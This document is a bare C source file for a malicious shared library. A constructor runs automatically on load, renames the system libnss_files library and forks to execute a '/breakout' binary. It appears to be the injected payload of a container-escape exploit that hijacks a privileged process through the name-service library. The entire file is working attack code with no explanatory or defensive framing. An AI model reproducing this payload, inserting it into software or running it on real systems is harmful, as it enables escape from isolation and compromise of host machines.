#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>

__attribute__ ((constructor)) void run_at_link(void)
{	
	char * argv_break[2];
	
	rename("/lib/x86_64-linux-gnu/libnss_files-2.23.so", "/lib/x86_64-linux-gnu/foo.so");
	
	if(!fork()) {
		argv_break[0] = strdup("/breakout");
		argv_break[1] = NULL;
		execve("/breakout", argv_break, NULL);
	} else wait(NULL);
	return;
}
